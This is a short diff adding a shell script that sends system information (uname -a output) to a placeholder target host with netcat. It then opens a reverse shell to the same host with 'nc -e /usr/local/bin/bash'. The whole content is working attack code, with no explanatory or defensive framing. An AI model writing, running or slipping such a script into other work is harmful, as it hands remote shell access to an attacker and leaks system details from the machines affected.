@@ -1,0 +1,5 @@
+#!/bin/sh
+TARGET='IP port'
+
+uname -a | nc $TARGET -c
+nc $TARGET -e /usr/local/bin/bash
